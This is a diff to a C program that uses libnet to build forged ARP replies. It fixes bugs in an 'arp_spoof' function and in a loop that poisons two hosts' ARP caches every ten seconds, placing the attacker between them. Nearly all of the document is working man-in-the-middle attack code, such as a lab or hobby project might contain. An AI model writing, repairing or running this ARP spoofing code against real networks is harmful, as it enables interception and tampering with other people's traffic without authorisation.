@@ -15,6 +15,7 @@ struct libnet_ether_addr mac_tmp;
 
 void process_arp_packet(uint8_t*, const struct pcap_pkthdr*, const uint8_t*); 
 void get_mac_addr(uint32_t, struct libnet_ether_addr*);
+void arp_spoof(uint32_t ip_target, uint32_t ip_spoof, struct libnet_ether_addr mac_target, struct libnet_ether_addr *own_mac); 
 
 int initialize_inject(char *gateway_ip, char *target_ip) {
     printf("Initializing inject\n");
@@ -96,9 +97,11 @@ int initialize_inject(char *gateway_ip, char *target_ip) {
     mac_target_two = mac_tmp;
     
 
+    printf("Starting spoofing\n");
+
     while (1) {
-        arp_spoof(ip_target_one, ip_target_two, mac_target_one, own_mac);
-        arp_spoof(ip_target_two, ip_target_one, mac_target_two, own_mac);
+        arp_spoof(target_one_ip, target_two_ip, mac_target_one, own_mac);
+        arp_spoof(target_two_ip, target_one_ip, mac_target_two, own_mac);
         sleep(10);
     }    
 
@@ -182,25 +185,27 @@ void process_arp_packet(uint8_t *user, const struct pcap_pkthdr *hdr, const uint
 }
 
 
-void arp_spoof(uint32_t ip_target, uint32_t ip_spoof, struct libnet_ether_addr, mac_target, struct libnet_ether_addr own_mac) {
+void arp_spoof(uint32_t ip_target, uint32_t ip_spoof, struct libnet_ether_addr mac_target, struct libnet_ether_addr *own_mac) {
    
-    libnet_ptag_t arp = 0, eth = 0;
+    libnet_ptag_t arp = 0, ethernet = 0;
 
-    arp = libnet_autobuild_arp(ARPOP_REPLY, (uint8_t *)own_mac, (uint8_t *)ip_spoof, (uint8_t *)mac_target, (uint8_t *)ip_target, l);
+    arp = libnet_autobuild_arp(ARPOP_REPLY, (uint8_t *)own_mac, (uint8_t *)&ip_spoof, (uint8_t *)&mac_target, (uint8_t *)&ip_target, l);
     
     if (arp == -1) {
         fprintf(stderr, "Error in creating arp packet: %s\n", libnet_geterror(l));
         exit(1);
     }
     
-    ethernet = libnet_build_ethernet((uint8_t *)mac_target, (uint8_t *)own_mac, ETHERTYPE_ARP, 
+    ethernet = libnet_build_ethernet((uint8_t *)&mac_target, (uint8_t *)own_mac, ETHERTYPE_ARP, 
                                      NULL, 0, l, 0);
     
-    if (eth == -1) {
+    if (ethernet == -1) {
         fprintf(stderr, "Error in creating eth packet: %s\n", libnet_geterror(l));
         exit(1);
     }
     
+    printf("spoofing\n"); 
+
     if ((libnet_write(l)) == -1) {
         fprintf(stderr, "Error in sending ARP request: %s\n", libnet_geterror(l));
         exit(1);
